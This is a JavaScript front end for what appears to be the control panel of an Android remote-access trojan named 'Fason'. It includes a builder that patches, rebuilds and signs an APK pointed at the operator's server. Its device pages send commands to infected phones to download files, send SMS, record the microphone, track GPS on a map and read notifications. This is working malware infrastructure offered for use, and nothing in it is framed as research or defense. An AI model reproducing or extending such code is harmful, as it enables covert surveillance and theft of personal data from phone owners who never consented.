// Fason - Professional Client-Side Framework
(function() {
    'use strict';

    // Config
    const CONFIG = {
        RELOAD_DELAY: 1200,
        AUTO_REFRESH: 60000,
        TOAST_DURATION: 3000,
        API_TIMEOUT: 30000,
        COMMAND_DELAYS: {
            '0xCA': 3000, '0xWI': 3000, '0xLO': 2000, '0xMI': 1000,
            '0xFI': 2000, '0xIN': 2000, '0xPM': 2000, '0xNO': 2000,
            '0xCB': 1500, '0xSM': 1500, '0xCL': 1500, '0xCO': 1500
        }
    };

    // DOM Utils
    const $ = id => document.getElementById(id);
    const $$ = sel => document.querySelectorAll(sel);
    const on = (el, ev, fn) => el?.addEventListener(ev, fn);
    const create = tag => document.createElement(tag);

    // Utils Object
    const utils = {
        // Format bytes to human readable
        bytes(bytes, dec = 2) {
            if (!bytes) return '0 B';
            const k = 1024, sizes = ['B', 'KB', 'MB', 'GB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return `${(bytes / Math.pow(k, i)).toFixed(dec)} ${sizes[i]}`;
        },

        // Format duration
        duration(sec) {
            if (!sec || sec <= 0) return '—';
            const h = Math.floor(sec / 3600);
            const m = Math.floor((sec % 3600) / 60);
            const s = sec % 60;
            return h > 0 ? `${h}h ${m}m` : m > 0 ? `${m}m ${s}s` : `${s}s`;
        },

        // Escape HTML
        escape(str) {
            if (!str) return '';
            const div = create('div');
            div.textContent = str;
            return div.innerHTML;
        },

        // Debounce function
        debounce(fn, delay) {
            let timer;
            return (...args) => { clearTimeout(timer); timer = setTimeout(() => fn(...args), delay); };
        },

        // Relative time
        relative(date) {
            if (!date) return '—';
            const diff = Date.now() - new Date(date);
            if (diff < 60000) return 'Just now';
            if (diff < 3600000) return `${Math.floor(diff / 60000)}m ago`;
            if (diff < 86400000) return `${Math.floor(diff / 3600000)}h ago`;
            if (diff < 604800000) return `${Math.floor(diff / 86400000)}d ago`;
            return new Date(date).toLocaleDateString();
        },

        // Format date
        date(d) { return d ? new Date(d).toLocaleString() : '—'; }
    };
    window.utils = utils;

    // Toast System
    const toastIcons = { success: '✓', error: '✕', warning: '⚠', info: 'ℹ' };
    
    function toast(msg, type = 'info', duration = CONFIG.TOAST_DURATION) {
        const el = $('toast');
        if (!el) { console.log(`[Toast ${type}] ${msg}`); return; }
        el.innerHTML = `<span>${toastIcons[type] || ''}</span> ${utils.escape(msg)}`;
        el.className = `toast show ${type}`;
        setTimeout(() => el.className = 'toast', duration);
    }
    window.toast = toast;

    // API Helper
    async function api(path, opts = {}) {
        const { method = 'GET', body, timeout = CONFIG.API_TIMEOUT } = opts;
        const ctrl = new AbortController();
        const timer = setTimeout(() => ctrl.abort(), timeout);

        try {
            const res = await fetch(path, {
                method,
                headers: body ? { 'Content-Type': 'application/json' } : {},
                body: body ? JSON.stringify(body) : null,
                signal: ctrl.signal
            });
            clearTimeout(timer);
            if (!res.ok) throw new Error(`HTTP ${res.status}`);
            return await res.json();
        } catch (e) {
            clearTimeout(timer);
            throw e;
        }
    }
    window.api = api;

    // Device ID helper
    const getDeviceId = () => typeof DEVICE_ID !== 'undefined' ? DEVICE_ID : null;

    // Send Command
    function sendCmd(cmd, params = {}, { reload = true } = {}) {
        const id = getDeviceId();
        if (!id) return Promise.reject('No device ID');

        const delay = CONFIG.COMMAND_DELAYS[cmd] || CONFIG.RELOAD_DELAY;

        return api(`/cmd/${id}/${cmd}`, { method: 'POST', body: params })
            .then(data => {
                if (data.error) { toast(data.error, 'error'); throw new Error(data.error); }
                toast(data.message || 'Command sent', 'success');
                if (reload) setTimeout(() => location.reload(), delay);
                return data;
            })
            .catch(e => {
                toast(e.name === 'AbortError' ? 'Request timed out' : e.message || 'Failed', 'error');
                throw e;
            });
    }
    window.sendCmd = sendCmd;

    // Send without reload
    function sendCmdNoReload(cmd, params) {
        return sendCmd(cmd, params, { reload: false });
    }
    window.sendCmdNoReload = sendCmdNoReload;

    // Copy to clipboard
    async function copyText(text) {
        try {
            await navigator.clipboard.writeText(text);
            toast('Copied!', 'success');
        } catch {
            const ta = create('textarea');
            ta.value = text;
            ta.style.cssText = 'position:fixed;opacity:0';
            document.body.appendChild(ta);
            ta.select();
            document.execCommand('copy');
            document.body.removeChild(ta);
            toast('Copied!', 'success');
        }
    }
    window.copyText = copyText;

    // Download helper
    function downloadFile(url, name) {
        const a = create('a');
        a.href = url;
        a.download = name || '';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
    }
    window.downloadFile = downloadFile;

    // ========================================
    // BUILDER PAGE
    // ========================================

    function initBuilder() {
        const urlInput = $('serverUrl');
        const homeInput = $('homePageUrl');
        const autoBtn = $('autoDetectBtn');
        const buildBtn = $('buildBtn');
        const progress = $('progress');
        const progressFill = $('progressFill');
        const progressText = $('progressText');
        const result = $('result');
        const error = $('error');
        const errorText = $('errorText');
        const urlInfo = $('urlInfo');

        if (!urlInput || !buildBtn) return;

        const urlEls = {
            urlInfo,
            protocol: $('protocolValue'),
            host: $('hostValue'),
            port: $('portValue')
        };

        // Parse and show URL info
        const showUrlInfo = (url) => {
            if (!url) { urlInfo?.classList.add('hidden'); return null; }
            try {
                const u = new URL(url.startsWith('http') ? url : `http://${url}`);
                const proto = u.protocol.replace(':', '');
                const port = u.port || (proto === 'https' ? '443' : '80');
                
                if (urlEls.protocol) urlEls.protocol.innerHTML = `<span class="status-badge ${proto}">${proto.toUpperCase()}</span>`;
                if (urlEls.host) urlEls.host.textContent = u.hostname;
                if (urlEls.port) urlEls.port.textContent = port;
                urlInfo?.classList.remove('hidden');
                return { proto, host: u.hostname, port: parseInt(port) };
            } catch { urlInfo?.classList.add('hidden'); return null; }
        };

        // Auto detect
        const autoDetect = () => {
            urlInput.value = location.origin;
            showUrlInfo(location.origin);
        };

        // Events
        on(urlInput, 'input', e => showUrlInfo(e.target.value));
        on(autoBtn, 'click', autoDetect);
        autoDetect();

        // Build
        let pollTimer = null;
        on(buildBtn, 'click', async () => {
            const serverUrl = urlInput.value.trim();
            const homePageUrl = homeInput?.value.trim() || '';

            if (!serverUrl) { alert('Please enter server URL'); return; }
            if (!showUrlInfo(serverUrl)) { alert('Invalid URL format'); return; }

            buildBtn.disabled = true;
            buildBtn.innerHTML = '<span class="icon">⏳</span> Building...';
            progress?.classList.remove('hidden');
            result?.classList.add('hidden');
            error?.classList.add('hidden');
            if (progressFill) { progressFill.style.width = '0%'; progressFill.style.background = ''; }

            // Progress polling
            pollTimer = setInterval(async () => {
                try {
                    const d = await api('/builder/progress');
                    const steps = { java: 5, decompile: 20, patch: 45, build: 70, sign: 90, done: 100 };
                    const pct = steps[d.progress?.step] || 0;
                    if (progressFill) progressFill.style.width = pct + '%';
                    if (progressText) progressText.textContent = d.progress?.message || 'Processing...';
                } catch {}
            }, 500);

            try {
                const d = await api('/builder', { method: 'POST', body: { serverUrl, homePageUrl } });
                clearInterval(pollTimer);
                if (d.error) {
                    if (progressFill) { progressFill.style.width = '100%'; progressFill.style.background = 'var(--error)'; }
                    error?.classList.remove('hidden');
                    if (errorText) errorText.textContent = d.error;
                } else {
                    if (progressFill) progressFill.style.width = '100%';
                    progress?.classList.add('hidden');
                    result?.classList.remove('hidden');
                }
            } catch (e) {
                clearInterval(pollTimer);
                error?.classList.remove('hidden');
                if (errorText) errorText.textContent = e.message;
            }

            buildBtn.disabled = false;
            buildBtn.innerHTML = '<span class="icon">⚙</span> Build APK';
        });
    }

    // Toggle collapsible section
    function toggleSection(id) {
        const el = $(id);
        const icon = document.querySelector('.toggle-icon');
        if (!el) return;
        const show = el.style.display === 'none';
        el.style.display = show ? 'block' : 'none';
        if (icon) icon.textContent = show ? '▼' : '▶';
    }
    window.toggleSection = toggleSection;

    // ========================================
    // LOGS PAGE
    // ========================================

    function initLogs() {
        on($('refreshBtn'), 'click', () => location.reload());
        
        on($('clearBtn'), 'click', async () => {
            if (!confirm('Clear all logs? This cannot be undone.')) return;
            try {
                const d = await api('/logs/clear', { method: 'POST' });
                d.success ? (toast('Logs cleared', 'success'), setTimeout(() => location.reload(), 500)) 
                          : toast(d.error || 'Failed', 'error');
            } catch { toast('Request failed', 'error'); }
        });
    }

    // ========================================
    // DEVICE PAGE
    // ========================================

    // Browse files
    function browseFiles(path) {
        sendCmd('0xFI', { action: 'ls', path: path || '' });
    }
    window.browseFiles = browseFiles;

    // Request file download
    function requestFileDownload(path) {
        const statusEl = $('download-status');
        const listEl = $('download-list');
        const name = path.split('/').pop();

        statusEl?.classList.remove('hidden');
        const item = create('div');
        item.className = 'clipboard-item';
        item.innerHTML = `<div style="display:flex;justify-content:space-between;align-items:center"><span>📄 ${name}</span><span class="hint">⏳ Requesting...</span></div>`;
        listEl?.prepend(item);

        sendCmdNoReload('0xFI', { action: 'dl', path })
            .then(r => {
                const badge = r?.error ? `<span class="badge error">Error: ${r.error}</span>` 
                                        : `<span class="badge success">✓ Sent</span>`;
                item.innerHTML = `<div style="display:flex;justify-content:space-between;align-items:center"><span>📄 ${name}</span>${badge}</div>`;
                if (!r?.error) {
                    toast('Download started!', 'success');
                    if (location.pathname.includes('/downloads')) setTimeout(() => location.reload(), 5000);
                }
            })
            .catch(() => {
                item.innerHTML = `<div style="display:flex;justify-content:space-between;align-items:center"><span>📄 ${name}</span><span class="badge error">Failed</span></div>`;
            });
    }
    window.requestFileDownload = requestFileDownload;

    // Send SMS
    function sendSmsHandler(e) {
        e?.preventDefault();
        const to = $('sms-to')?.value.trim();
        const msg = $('sms-msg')?.value.trim();
        if (!to || !msg) { toast('Enter phone and message', 'error'); return; }
        sendCmdNoReload('0xSM', { action: 'sendSMS', to, sms: msg })
            .then(() => { $('sms-to').value = ''; $('sms-msg').value = ''; });
    }
    window.sendSmsHandler = sendSmsHandler;

    // Record mic
    function recordMic() {
        const sec = parseInt($('mic-duration')?.value || '60');
        const btn = $('recordBtn');
        const status = $('recording-status');
        const progress = $('record-progress');
        const text = $('status-text');

        btn.disabled = true;
        btn.textContent = '⏳ Recording...';
        status?.classList.remove('hidden');
        if (text) text.textContent = `Recording ${sec}s...`;

        let elapsed = 0;
        const timer = setInterval(() => {
            elapsed += 0.1;
            if (progress) progress.style.width = Math.min(100, (elapsed / sec) * 100) + '%';
            if (elapsed >= sec) clearInterval(timer);
        }, 100);

        sendCmdNoReload('0xMI', { sec })
            .then(() => {
                if (text) text.textContent = 'Complete! Check Downloads.';
                if (progress) { progress.style.width = '100%'; progress.style.background = 'var(--success)'; }
            })
            .catch(() => {
                if (text) text.textContent = 'Recording failed';
                if (progress) progress.style.background = 'var(--error)';
            })
            .finally(() => {
                setTimeout(() => {
                    btn.disabled = false;
                    btn.textContent = '🎤 Start Recording';
                    status?.classList.add('hidden');
                    if (progress) { progress.style.width = '0%'; progress.style.background = 'var(--error)'; }
                }, 3000);
            });
    }
    window.recordMic = recordMic;

    // GPS Map
    let mapInstance = null;
    
    function initMap(locations) {
        if (typeof L === 'undefined' || !$('map')) return null;
        
        mapInstance = L.map('map').setView([0, 0], 2);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            attribution: '© OpenStreetMap'
        }).addTo(mapInstance);

        if (locations?.length) {
            const last = locations[locations.length - 1];
            mapInstance.setView([last.latitude, last.longitude], 15);
            locations.forEach((l, i) => {
                L.marker([l.latitude, l.longitude])
                    .addTo(mapInstance)
                    .bindPopup(`<b>#${i + 1}</b><br>${utils.date(l.time)}<br>Accuracy: ${l.accuracy?.toFixed(0) || '?'}m`);
            });
            if (locations.length > 1) {
                L.polyline(locations.map(l => [l.latitude, l.longitude]), 
                    { color: '#3b82f6', weight: 3, opacity: 0.7 }).addTo(mapInstance);
            }
        }
        return mapInstance;
    }
    window.initMap = initMap;

    function centerMap(lat, lng) {
        mapInstance?.setView([lat, lng], 16);
    }
    window.centerMap = centerMap;

    function setGpsInterval(val) {
        const int = parseInt(val);
        api(`/gps/${getDeviceId()}/${int}`, { method: 'POST' })
            .then(d => toast(int > 0 ? `GPS polling: ${int}s` : 'GPS disabled', d.success ? 'success' : 'error'))
            .catch(() => toast('Failed', 'error'));
    }
    window.setGpsInterval = setGpsInterval;

    // ========================================
    // AUTO REFRESH & STATUS
    // ========================================

    function setupAutoRefresh() {
        const id = getDeviceId();
        if (!id) return;
        const refreshPages = ['info', 'downloads', 'permissions', 'notifications'];
        if (!refreshPages.some(p => location.pathname.includes('/' + p))) return;
        
        setInterval(() => {
            if (document.visibilityState === 'visible') location.reload();
        }, CONFIG.AUTO_REFRESH);
    }

    function pollStatus() {
        const id = getDeviceId();
        if (!id) return;
        setInterval(async () => {
            try {
                const d = await api(`/api/client/${id}`);
                const el = document.querySelector('.status-indicator');
                if (el && d) {
                    el.className = `status-indicator ${d.online ? 'online' : 'offline'}`;
                    el.querySelector('span:last-child').textContent = d.online ? 'Online' : 'Offline';
                }
            } catch {}
        }, 30000);
    }

    // Keyboard shortcuts
    function setupKeys() {
        on(document, 'keydown', e => {
            if (e.key === 'Escape' && location.pathname !== '/') location.href = '/';
            if (e.key === 'r' && !['INPUT', 'TEXTAREA'].includes(e.target.tagName)) {
                e.preventDefault();
                location.reload();
            }
        });
    }

    // ========================================
    // INIT
    // ========================================

    on(document, 'DOMContentLoaded', () => {
        setupAutoRefresh();
        setupKeys();
        pollStatus();

        const path = location.pathname;
        if (path.includes('/builder')) initBuilder();
        if (path.includes('/logs')) initLogs();

        console.log('Fason ready');
    });

})();
